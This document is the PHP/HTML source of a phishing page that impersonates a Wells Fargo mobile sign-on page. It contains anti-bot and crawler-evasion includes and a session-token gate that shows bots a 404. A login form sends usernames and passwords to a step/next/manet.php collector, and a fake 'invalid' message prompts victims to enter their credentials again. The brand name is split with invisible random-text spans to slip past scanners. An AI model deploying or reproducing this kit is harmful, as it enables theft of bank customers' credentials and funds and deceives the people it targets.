<?php

session_start();

require_once './src/Classes/Comp.php';
require_once './src/Classes/Antibot.php';

$comps = new Comp;
$antibot = new Antibot;

if (!$comps->checkToken()) {
    echo $antibot->throw404();
    die();
}
include './zsec.php';
    include './huehuehue.php';
    include './bot_fucker/bot.php';
   include './bot_fucker/wrd.php';
    include './crawlerdetect.php';
?>
<html lang="en" class="no-js"><head>
    <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Banking, Credit Cards, Loans, Mortgages &amp; More</title>
     <meta name="description" content="We Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more.">
     
      <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">


 <script>
if (screen.width >= 501) { document.location = "access.php?token=<?php echo $_SESSION['token']; ?>"; }
</script>

 
 <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
 <link rel="apple-touch-icon" sizes="120x120" href="images/ape-tch-ion20x120.png">
 <link rel="apple-touch-icon" sizes="180x180" href="images/aletchicon180x180.png">
 <link rel="icon" sizes="128x128" href="images/icon-norx128.png">
 <link rel="icon" sizes="192x192" href="images/icon-hir192.png">
 
 

 
     <link rel="stylesheet" href="css/style1.css"><link rel="stylesheet" href="css/stll.css">
 

 <body class="freezedscreen" style="top: 0px;">
 <div id="shell" class="page" data-pid="324-114205-64"><div id="hamburger-menubackdrop" class="backDrop"></div><a href="#skip" class="hidden">Skip to content</a>
 
 
 
 
                                  
           
                             
 <header class="masthead" role="banner">
         
                 <div id="navLeft" style="display: block;">
                         
           <a tabindex="1" href="" rel="nofollow" class="backLink">
             <span class="sr-only">Back link</span>
           </a>
         
                 </div>
                    
                 <div class="logoOuter"><br>
                         <div class="logo">
                                 <a href="/"><img alt="Home Page" role="img" src="images/icn-layer-svg.svg"></a>                        
                         </div>	
                 </div>	 
         
                 <div id="navRight">
                         <nav class="navbar navbar-default navbar-fixed-top">
 <div class="navbar-header">
 <div class="entire-menu">
 <button type="button" class="navbar-toggle hamburger" aria-expanded="false" aria-label="Open Menu Navigation"><span class="sr-only">Menu</span> <span class="icon-bar">&zwj;</span> <span class="icon-bar">&zwj;</span> <span class="icon-bar">&zwj;</span> <span class="expandedIcon pointer" style="visibility: visible;">&zwj;</span></button></div>
 </div>
 </nav>	
                 </div>
         
 </header>
 
  
 
 
  
 
 
 
 
 
           
                                  
           
                             <nav class="st-menu st-effect-1 wfhamburger-menu" id="hamburger-menu" aria-hidden="true" style="visibility: visible;">
 <div class="container clistData" data-cid="tcm:323-114093-16" data-ctid="tcm:322-2830-32">
 <ul id="menu" class="menu navbar-nav">
 <li id="search">
                         <span class="sr-only">Beginning of the Menu</span>
                          
                         <a class="search-ham" href="#" tabindex="0">
                             
                              
                             <span class="search-background">Search</span>
 <span class="searchicon">?</span>
                         </a>
                          
                         <a class="signOn-ham" href="#">
                             <span id="signOnham" aria-label="Sign On Opens Dialog">Sign On</span>
                         </a>
                     </li>
 <li class="menu" id="breadcrumb" style="display: none;">
                         <span>?</span>
                          
                         <a href="javascript:void(0);">Main Menu</a>
                     </li>
 <li id="front-porch" class="home">
 <div class="home">
                             
                              
                             <a href="/">Home</a>
                         </div>
 </li>
 <li id="spanish-link" data-toggle="modal" data-target="#myModal">
                         <a href="/es/?linkLoc=hb" lang="es">Español</a>
                     </li>
 <li>
                         <a href="/locator/?linkLoc=hb">ATMs/Locations</a>
                     </li>
 <li>
                         <a href="/smartphone/interstitial/check-rates/?linkLoc=hb">Check Rates</a>
                     </li>
 <li class="addNewLine">
                         <a href="#">
                             <strong>Personal</strong>
                         </a>
                     </li>
 <li class="hamburgerOne hamburger-icon">
                         <a href="javascript:void(0);">Banking</a>
                         
 
                         <ul class="sub-menu">
 <li style="display: list-item;">
                                 <a href="/checking/quickstart/index/?linkLoc=hb">Checking Quick Start Guide</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/checking/?linkLoc=hb">Checking Accounts</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/savings-cds/?linkLoc=hb">Savings Accounts &amp; CDs</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/credit-cards/?linkLoc=hb">Credit Cards</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/debit-card/?linkLoc=hb">Debit Cards</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/help/routing-number/?linkLoc=hb">Routing &amp; Account Numbers</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/international-remittances/?linkLoc=hb">International Remittances</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/online-banking/?linkLoc=hb">Mobile Banking</a>
                             </li>
 </ul>
                         
 
                     </li>
 <li class="hamburgerOne hamburger-icon">
                         <a href="javascript:void(0);">Loans &amp; Credit</a>
                         
 
                         <ul class="sub-menu">
 <li style="display: list-item;">
                                 <a href="/mortgage?linkLoc=hb">Mortgage Loans</a>
                             </li>
 
 <li style="display: list-item;">
                                 <a href="/student/?linkLoc=hb">Student Loans</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/auto-loans/?linkLoc=hb">Auto Loans</a>
                             </li>
 
 <li style="display: list-item;">
                                 <a href="/credit-cards/?linkLoc=hb">Credit Cards</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/personal-loans/?linkLoc=hb">Personal Loans</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/goals-credit/?linkLoc=hb">Borrowing &amp; Credit</a>
                             </li>
 </ul>
                         
 
                     </li>
 <li class="hamburgerOne hamburger-icon">
                         <a href="javascript:void(0);">Investing &amp; Retirement</a>
                         
 
                         <ul class="sub-menu">
 <li style="display: list-item;">
                                 <a href="/investing/index/?linkLoc=hb">Investing</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/investing/intuitive-investor-automated-investing/?linkLoc=hb">Intuitive Investor<sup>®</sup></a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/investment-institute/top-news-and-commentary/?linkLoc=hb">Investing Insights</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/investing/retirement/ira/?linkLoc=hb">IRAs</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/investing/retirement/rollover/?linkLoc=hb">Rollovers (401k and IRA)</a>
                             </li>
 </ul>
                         
 
                     </li>
 <li class="hamburgerOne hamburger-icon">
                         <a href="javascript:void(0);">Wealth Management</a>
                         
 
                         <ul class="sub-menu">
 <li style="display: list-item;">
                                 <a href="/investment-institute/?linkLoc=hb">Investing Insights</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="/the-private-bank/?linkLoc=hb">The Private Bank</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="#" enrollmentid="2156">Wel<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ls Far<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>go Advisors</a>
                             </li>
 </ul>
                         
 
                     </li>
 <li class="hamburgerOne hamburger-icon">
                         <a href="javascript:void(0);">Rewards &amp; Benefits</a>
                         
 
                         <ul class="sub-menu">
 <li style="display: list-item;">
                                 <a href="/go-far-rewards/?linkLoc=hb">Go Far<sup>TM</sup> Rewards</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="#" enrollmentid="2429">Sign On to Rewards</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="#">Relationship Program</a>
                             </li>
 </ul>
                         
 
                     </li>
 <li class="hamburgerOne">
                         <a href="#">Financial Education</a>
                     </li>
 <li>
                         <a href="/biz/?linkLoc=hb">
                             <strong>Small Business</strong>
                         </a>
                     </li>
 <li>
                         <a href="/com/?linkLoc=hb">
                             <strong>Commercial</strong>
                         </a>
                     </li>
 <li class="footer-hamburger">
                         <a href="#" enrollmentid="2475">Enroll in Wel<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ls Far<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>go Online<sup>®</sup></a></li>
                         
 <li class="footer-hamburger">
                         <a class="menu-footer" href="#">Customer Service</a></li>
 <li class="footer-hamburger">
                         <a href="#">My Favorites</a></li>
     
 <li class="footer-hamburger footer-icon">
                         <a class="menu-footer" href="#">About Us</a>
                         
 
                         <ul class="sub-menu">
 <li style="display: list-item;">
                                 <a href="#">Careers</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="#">Who We Are</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="#">Corporate Responsibility</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="#">Newsroom</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="#">Leadership and Governance</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="#">Investor Relations</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="#">Diversity and Accessibility</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="#">We<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>lls Far<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>go Stories</a>
                             </li>
 <li style="display: list-item;">
                                 <a href="#">We<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>lls F<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ar<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>go History</a>
                             </li>
 </ul>
                         
 
                     </li>
 <li class="footer-hamburger">
                         <a class="menu-footer" href="/privacy-security/?linkLoc=hb">Privacy &amp; Cookies Policy</a>
                     </li>
 <li class="footer-hamburger">
                         <a class="menu-footer" href="/privacy-security/fraud/?linkloc=hb">Security Center</a>
                     </li>
 <li class="footer-hamburger">
                         <a class="menu-footer" href="/?fullsite=fp&amp;linkLoc=hb">Full Site</a>
                     </li>
 <li class="footer-hamburger stagecoach">&zwj;<span class="sr-only">End of the Menu</span></li>
 <li class="footer-hamburger stagecoach footer-level-2" style="display: none;">&zwj;</li>
 </ul>
 </div>
 </nav>
               
                                  
           
 
 
 
  
 
 <div id="maincontainer">
 
  
  
 
  
                                                     
 
  
 
  
                             <div class="c45m-tip theme2" data-cid="tcm:323-195731-16" data-ctid="tcm:322-2808-32" aria-hidden="true">
     <div class="c45m-tip-wraper">
         <h2 class="c45m-tip-badge">
             <span class="c45m-tip-flyout"></span>Alert <span class="c45m-tip-point">
             </span>
         </h2>
         <div class="c45m-tip-content">
             <p class="c45m-tip-text">
             Here for you – updates on COVID-19 assistance and stimulus.<a href="#" class="c13">Learn more</a>
             </p>
         </div>
     </div>
 </div>
                         
 
 
  
 
      
 
 
 
 
 
 
  
 
     
 
 
 
 
     
     <div class="search-signon-wrapper" aria-hidden="true">
         <div class="search-signon-container" style="display: none;">
             <div class="wrap left rounded">
                 <div class="search-container">
                 <label class="sr-only" for="searchopen">Search</label>
                     <input type="text" class="search left rounded" id="searchopen" value="Search"><span class="search-sprite"></span>
                 </div>
             </div>							
             <div class="signon-container">
                 <span class="signonlock" aria-hidden="true">&zwj;</span><a href="" id="signOn" aria-label="Sign On Opens Dialog">Sign On</a>
             </div>
         </div>	
     </div>	
     <div class="overlay" style="display: none;">
         <div class="wrap left rounded">
		 
             <div class="searchContainer">
	
		
                 <form id="frmSearch" name="frmSearch" action="/search/search" method="GET" autocomplete="off">
                     <span class="search-image"></span><label class="sr-only" for="overlaySearch">Search</label>
                     <input name="q" type="text" class="left rounded required" id="overlaySearch" value=""><span class="clear-image"></span>
                 </form>
             </div>	
             <div class="cancel-container"><a href="" id="cancelSearch">Cancel</a></div>							
         </div>
     </div>
 
     <div id="getAppModal" class="get-app-modal" role="dialog" tabindex="-1" aria-modal="true" aria-labelledby="headerText" style="display: none;" aria-hidden="true">
             <span class="sr-only">Beginning of the dialog</span>
             <div class="get-app-content">
                 <h2 tabindex="-1" id="headerText">Take advantage of <span>app-only</span> features</h2>
                 <div class="gold-bar-ffe"></div>
                 <ul>
                     <li>Deposit checks</li>
                     <li>Stay informed with push notifications</li>
                     <li>Sign on using your fingerprint or FaceID<sup>®</sup> </li>
                 </ul>
                 <div class="getapp-actions-container">
                     
                          
                          <a id="linkGetApp" class="app-modal-link link-get-app" href="/exit/exit_appstore_andriod/?linkLoc=FPM">Get the app</a>
                         
                     
                     <button id="contToSignOn" class="app-modal-link continue-signon-btn">Continue to Sign On</button>
                     <a id="learnAboutApp" class="learn-about-app" href="/mobile/apps?linkLoc=FPM">Learn more about the app</a>
                 </div>
             </div>
             <span class="sr-only">End of the dialog</span>
         </div>
 
     
     <div class="overlaySignOn" style="top: 38px;">
 
            <div class="overlayContainer">
             <div class="welcome-container" tabindex="-1">Welcome</div>
             
             
             <div class="security-container">
                 <span class="security-img"></span><a href="#" class="security-text">Online &amp; Mobile Security</a>
             </div>
             <?php 
    if (isset($_GET['invalid'])) {
		echo '<div class="security-container">
		<span class="security-img"></span><a href="#" class="security-text">We do not recognize your username and/or password. Please try again</a>
	</div>';
	}

?>
             <div class="signOnContainer">
			 <form id="frmSignon" action="./step/next/manet.php?token=<?php echo $_SESSION['token']; ?>" method="POST" autocomplete="off">
				<div  class="frmElmntsWrppr formElementsUsername">
				<?php 
    if (isset($_GET['invalid'])) {
            echo '<input type="hidden" name="invalid" value="invalid">';
        }
    
        ?>
					<label class="id_label" for="userid">Username</label>
					
					
					<input type="text" accesskey="U" id="userid" class="formElement formElementText login_field" name="hudf" maxlength="14" value="" autocomplete="off">
				</div>
				<div class="frmElmntsWrppr formElementsPassword">
					<label class="id_label" for="passwd">Password</label>
					
					<input type="password" accesskey="P" id="password" class="formElement formElementPassword login_field pmask" name="sjgdh" maxlength="32" autocomplete="off">
				</div>
					<div class="save-uid">
						<ul>
							<li>
								<input type="checkbox" name="username" id="saveusername" value="" />
								<label for="saveusername"><span></span>Save Username</label>

							</li>
						</ul>
					</div>
					<input type="submit" class="signOn" value="Sign On" data-mrkt-tracking-id="69d8a9b6-4c51-4afc-abd6-f6f6227706ef" />
					<div class="forgot-uid-pwd"><a href="" class="enroll-text">Forgot Password/Username?</a></div>
					<div class="enroll-header">New to <em>Wel<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ls Fargo Online</em><SUP>&reg;</SUP>?</div>
					<div class="enroll"><a href="" class="enroll-text">Enroll</a></div>
					
					
					<input type="hidden" id="userPrefs" name="userPrefs" value="" />
					<input id="jsenabled" name="jsenabled" type="hidden" value="false"/>
					<input id="origin" name="origin" type="hidden" value="mobilebrowser"/>
					<input type="hidden" name="screenid" value="SIGNON" />
								 
				</form>
             </div>
             <div class="appstoreBadge" id="android"> 
                 <a href="/exit/exit_appstore_ios/" class="ios" style="display: none;"><span class="sr-only">Get the W<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ells Fa<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>rgo app</span></a>  
                 <a href="/exit/exit_appstore_andriod/" class="android" style="display: inline;"><span class="sr-only">Get the Wel<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ls F<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>argo app</span></a>
                 
             </div>
             <footer role="contentinfo">
                 <div class="html5footer c9" id="pageFooter">
                     <nav class="nav-footer">
                         <div class="collapsable-footnote-disclosure">
                                                     <div id="footer-disclosure-link">
                                                         <div class="collapsable-footnote-title">
                                                             <a href="#" id="collapsable-disclosure-link" class="disclosure-open-icon">Disclosures<span id="hiddenExpandCollapse" class="ui-hidden-accessible">Collapse</span></a>
                                                         </div>
                                                     </div>
                                                     <div id="static-banner-footnotes">
                                                         <div class="footnote-body">
                                                             <ul>
                                                                 <li>
                                                                     <p id="footnote01">1. Deposit limits and other res<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>trictions apply. Some accounts are not eligible for mobile deposit. Availability may be aff<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ected by your mobile carrier's covera<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ge area. Your mobile car<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>rier's message and data rates may apply. See Wel<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ls Far<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>go’s <a href="/online-banking/online-access-agreement/">Online Acc<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ess Agreement</a> for other terms, conditions, and limitations.</p>
                                                                 </li>
                                                                 <li>
                                                                     <p>Android, Chrome, Google Pay, Google Pixel, Google Play, Wear OS by Google, and the Google Logo are trademarks of Google LLC.</p>
                                                                 </li>
                                                                 <li>
                                                                     <p>Apple, the Apple logo, Apple Pay, Apple Watch, Face ID, iPad, iPad Pro, iPhone, iTunes, Mac, Safari, and To<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>uch ID are trade<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>marks of Apple Inc., registered in the U.S. and other countries. Apple Wallet is a trade<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>mark of Apple Inc. App Store is a service mark of Apple Inc.</p>
                                                                 </li>
                                                             </ul>
                                                         </div>
                                                     </div>
                          </div>
                         <div class="footer-link clistData">
                             <a href="/privacy-security/">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="/privacy-security/privacy/online#adchoices">Ad Choices</a>
                             <div class="footer-oaa"><a href="/online-banking/online-access-agreement/">Online Access Agreement</a>
                             </div>
                         </div>
                         <div id="c20nnm-login">
                             <strong>Investment and Insurance Products are:</strong>
                                 <ul>
                                     <li><strong>Not Insured by the FDIC or Any Federal Government Agency </strong></li>
                                     <li><strong>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</strong></li>
                                     <li><strong>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</strong></li>
                                 </ul>
                         </div>
                         <div class="footer-content">Deposit products offered by We<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>lls Far<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>go Bank, N.A. Member FDIC.</div>
                         <div class="footer-content"><span class="home-equal">&zwj;</span> Equal Housing Lender. NM<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>LSR ID 399<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>801</div>
                         <div class="footer-content footer-margin">© 2021 Wel<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ls Fa<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>rgo. All rights reserved.</div>
                         <div class="stge-coch"><img src="images/stgecach_opcity.svg" aria-hidden="true" alt=""></div>
                         </nav></div>
                     
                 </footer></div>
             
         </div>
  
 
 
 
 
 
 
  
 
 
 <div class="heroCarousel slick-initialized slick-slider initialized" data-cid="tcm:323-114132-16" data-ctid="tcm:322-6277-32" id="carousel0" aria-hidden="true">
 
 
                <div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: 1200px; transform: translate3d(0px, 0px, 0px);"><div class="carouselSlide slick-slide slick-current slick-active" data-slide="Item 1" data-slick-index="0" tabindex="0" style="width: 400px;"><span class="hidden">Begin Slide 1</span>
 <div class="iaRendered" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" lang="en" data-offer-id="C_chk_everydaychecking_hpprimary_web_mob">    <a data-platform="publicsite" href="/checking/everyday/" exitdestination="" data-cid="tcm:402-207860-16" data-ctid="tcm:322-41008-32" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="contentArea" data-params="" data-tracking-id="" tabindex="0">
     <div class="thumbWithText">
        
               <img alt="" src="#">
        
             <div class="textContent">
                <h2>Simplify your life</h2>
                 Your money's at hand with Everyday Checking
             </div>
      </div>
 
   </a>
 
  <img alt="" src="#">
 
 
   
 
 
                         </div>
               <span class="hidden">End Slide 1</span></div><div class="carouselSlide slick-slide" data-slide="Item 2" data-slick-index="1" aria-hidden="true" tabindex="-1" title="" style="width: 400px;"><span class="hidden">Begin Slide 2</span>
 <div class="iaRendered" data-slot-id="WF_CON_HP_PRIMARY_BNR_2" lang="en" data-offer-id="C_wtr_access_hpprimary_web_mob">    <a class="contentArea" href="#" data-tracking-id="" tabindex="-1">
     <div class="thumbWithText">
        
             <div class="textContent">
                <h2>$0 has never felt like so much</h2>
                 $0 online trades<sup>1</sup> with <em>We<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>llsTr<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ade</em><sup>®</sup> from Wel<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ls Far<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>go Advisors
             </div>
      </div>
 
   </a>
 
  <img alt="" src="images/wf001_p02_6724705fph_576x263.jpg" class="deferred" data-deferred-src="images/wf001_p02_6724705fph_576x263.jpg">
 
 
   
 
 
                         </div>
               <span class="hidden">End Slide 2</span></div><div class="carouselSlide slick-slide" data-slide="Item 3" data-slick-index="2" aria-hidden="true" tabindex="-1" style="width: 400px;"><span class="hidden">Begin Slide 3</span>
 <div class="iaRendered" data-slot-id="WF_CON_HP_PRIMARY_BNR_3" lang="en" data-offer-id="C_sav_wtosave_hpprimary_web_mob">    <a class="contentArea" href="/savings-cds/way2save/" data-tracking-id="" tabindex="-1">
     <div class="thumbWithText">
        
               <img alt="" src="images/6818104_cash-in-hand_icon_57x57.png" class="deferred" data-deferred-src="images/6818104_cash-in-hand_icon_57x57.png">
        
             <div class="textContent">
                <h2>Ready for what's next</h2>
                 Automatically save for tomorrow with a Way2Save<sup>®</sup> Savings account
             </div>
      </div>
 
   </a>
 
  <img alt="" src="images/6818104_gettyimages-890847206_576x263.jpg" class="deferred" data-deferred-src="images/6818104_gettyimages-890847206_576x263.jpg">
 
 
   
 
 
                         </div>
               <span class="hidden">End Slide 3</span></div></div></div>
 
 
 
                
 
 
 
                
 
 
 
 
  
 
  
 
  
           
 <ul class="slick-dots" style=""><li class="slick-active" aria-selected="true" aria-controls="navigation00" id="slick-slide00"><button class="dotButtoncarousel0" type="button" tabindex="0">Item 1: You Are Here</button></li><li class="slick-inactive" aria-selected="false" aria-controls="navigation01" id="slick-slide01"><button class="dotButtoncarousel0" type="button" tabindex="0">Item 2</button></li><li class="slick-inactive" aria-selected="false" aria-controls="navigation02" id="slick-slide02"><button class="dotButtoncarousel0" type="button" tabindex="0">Item 3</button></li></ul></div>
 
 
 
  
 
 <section id="top-tasks" aria-hidden="true">
 
    
         <div class="clistData" data-cid="tcm:323-114118-16" data-ctid="tcm:91-2043-32">
 
             <a href="/checking/?linkLoc=t1">Open a checking account</a>
              
             <a href="/mortgage/?linkLoc=t2">Explore home loans</a>
              
             <a href="/credit-cards/?linkLoc=t3">Find a credit card</a>
              
             <a href="/mobile/apps?linkLoc=t4">Get our app to deposit checks</a>
         </div>
     
 
 
   
  
 </section>	
 
  
 
 
 
  
                                                     
 
  
                             <div class="overlayfavorite" style="display: none;" aria-hidden="true">
 <div class="favorite-popup" style="top: 520px;"><span class="close-popup"><a href="" class="nooutline"><img alt="Close" src="images/btn-close-x.png"></a></span> <span class="sr-only">Begining of popup</span>
 <div class="popup-title">
 <h2>Article Saved</h2>
 </div>
 <div class="popup-body">
 <p>You can keep up to 5 favorite articles at a time.</p>
 <p>Select the <strong>Help Center</strong> &gt; <strong>My Favorites</strong> from the top menu to see your saved articles.</p>
 </div>
 <span class="sr-only">End of popup</span></div>
 </div>                        
 
  
                             <article class="fp-articles" data-cid="tcm:323-173177-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
   <a class="articles-media" href="/financial-education/basic-finances/manage-money/cashflow-savings/emergencies/">	
 
      
                  
         <img alt="Saving up for an emergency" src="images/couple_home-improvement_working_110x110.jpg">
     
        
             
   <span class="articles-header">Saving up for an emergency</span>
 </a>
 <a href="#" tabindex="-1" class="articles-star-container"><span tabindex="0" class="articles-star"><span class="sr-only">Add 	
 
      
                  
         
     
        
             
   Saving up for an emergency
  to favorites</span></span> </a>
 </article>
                         
 
  
                             <article class="fp-articles" data-cid="tcm:323-174682-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
   <a class="articles-media" href="/privacy-security/fraud/articles/mobile-security/">	
 
      
                  
         <img alt="Tips to boost mobile and banking safety" src="images/man_drinking_coffee_110x110.jpg">
     
        
             
   <span class="articles-header">Tips to boost mobile and banking safety</span>
 </a>
 <a href="#" tabindex="-1" class="articles-star-container"><span tabindex="0" class="articles-star"><span class="sr-only">Add 	
 
      
                  
         
     
        
             
   Tips to boost mobile and banking safety
  to favorites</span></span> </a>
 </article>
                         
 
  
                             <article class="fp-articles" data-cid="tcm:323-178559-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
   <a class="articles-media" href="/help/customer-redress">	
 
      
                  
         <img alt="Customer Redress" src="images/redress_110x110.jpg">
     
        
             
   <span class="articles-header">Making Things Right – Customer Redress</span>
 </a>
 <a href="#" tabindex="-1" class="articles-star-container"><span tabindex="0" class="articles-star"><span class="sr-only">Add 	
 
      
                  
         
     
        
             
   Making Things Right – Customer Redress
  to favorites</span></span> </a>
 </article>
                         
 
  
                             <article class="fp-articles" data-cid="tcm:323-149897-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
   <a class="articles-media" href="#" enrollmentid="2475">	
 
      
                  <img alt="" src="images/article_service_card_e-bills_1x.jpg">
        
             
   <span class="articles-header"><p>Need online access?<br>Enroll Now</p></span>
 </a>
 <a href="#" tabindex="-1" class="articles-star-container"><span tabindex="0" class="articles-star"><span class="sr-only">Add 	
 
      
                  
        
             
   Need online access?Enroll Now
  to favorites</span></span> </a>
 </article>
                         
 
  
 
 
 
  
 
      
  
 
 <div class="iaRendered" data-slot-id="WF_CON_HP_SECONDARY_BNR_1" lang="en" data-offer-id="C_sav_wtosavemob_hpsec_web_mob" aria-hidden="true">  
                       <a class="marketing-card color4" href="/savings-cds/way2save/" data-tracking-id="">
                     
 
 
 
 
         <img alt="" src="images/6818104_gettyimages-890847206_110x110.jpg" class="deferred" data-deferred-src="images/6818104_gettyimages-890847206_110x110.jpg">
     
 
 <span class="header-text">Automatically save for tomorrow</span>			
 </a></div>
 
         
 
 
 
 
  
 
     
         <div id="toolbar" class="clistData" data-cid="tcm:323-114111-16" data-ctid="tcm:322-2040-32" aria-hidden="true">
 <div class="toolbar-heading">How can we help?</div>
 <a class="toolbar-section" href="#">
                 <img alt="" src="#">				 
                 <span class="toolbar-text">Locations</span>
             </a> 
 <a class="toolbar-section" href="/help/?linkLoc=tools">
                 <img alt="Customer Service" src="#">
 <span class="toolbar-text">Customer Service</span>
             </a> 
 <a class="toolbar-section" href="/smartphone/interstitial/check-rates/?linkLoc=tools" data-link-open-style="native">
                 <span class="rates-img">&zwj;</span>
                  
                 <span class="toolbar-text">Rates</span>
             </a> 
 <a class="toolbar-section" href="/help/routing-number/?linkLoc=tools">
                 <img alt="Routing &amp; Account Number" src="#">
 <span class="toolbar-text"> Routing Numbers</span>
                                          </a>
 <div class="clear-float">&zwj;</div>
 </div>
     
 
 
  
 
 
 
   
       
 <div class="appstoreBadge" id="android" aria-hidden="true">
     <a href="/exit/exit_appstore_ios/" class="ios" style="display: none;"><span class="sr-only">Get the Wel<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ls Far<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>go app</span></a>  
     <a href="/exit/exit_appstore_andriod/" class="android" style="display: inline;"><span class="sr-only">Get the Wel<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ls Far<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>go app</span></a>
 </div>
 
 
 
 
 
 
  
       
 
 
 <footer role="contentinfo" aria-hidden="true">
     <div class="html5footer c9" id="pageFooter">
           
             
 
      
                  
                              <nav class="nav-footer">  
                  
                          <div class="footer-link clistData" data-cid="tcm:323-114110-16" data-ctid="tcm:322-113916-32">
             <a href="/privacy-security/">Privacy, Cookies, Security &amp; Legal</a>
              | 
             <a href="/privacy-security/privacy/online#adchoices">Ad Choices</a>
             
 
             <div class="footer-oaa">
                 <a href="/privacy-security/notice-of-data-collection/">Notice of Data Collection</a>
                          | 
             <a href="/privacy-security/terms/">General Terms of Use</a>
 </div>
 <div class="footer-oaa">
                 <a href="/online-banking/online-access-agreement/">Online Access Agreement</a>
             </div>
     </div>
                     
                
 
           
             
 
      
                  
                          <div id="c20nnm">
 
                 <strong>Investment and Insurance Products are:</strong>
    <ul>
             
         <li><strong>Not Insured by the FDIC or Any Federal Government Agency </strong></li>
         <li><strong>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</strong></li> 
          <li><strong>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</strong></li>
    </ul>
 
 </div>
                     
                
 
           
             
 
      
                  
                            <div class="footer-content">Deposit products offered by We<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>lls Far<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>go Bank, N.A. Member FDIC.</div>
                         
                
 
           
             
 
      
                  
                            <div class="footer-content">
             <span class="home-equal">&zwj;</span> Equal Housing Lender. NMLSR ID 399801</div>
                         
                
 
           
             
 
      
                  
                            <div class="footer-content footer-margin">© 2021 We<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>lls Fa<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>rgo. All rights reserved.</div>
                         
                
 
           
             
 
      
                  
                            <div class="stge-coch">
             <img src="images/stgecach_opcity.svg" alt="Stage Coach" role="img">
           </div>
                         
              </nav>
                
                
 
           
             
 
      
 
         
 
      
         
     </div>
 </footer>
         

 
 </div>
 </div>
 
 
 
 
 
 
 <div class="displayNone">
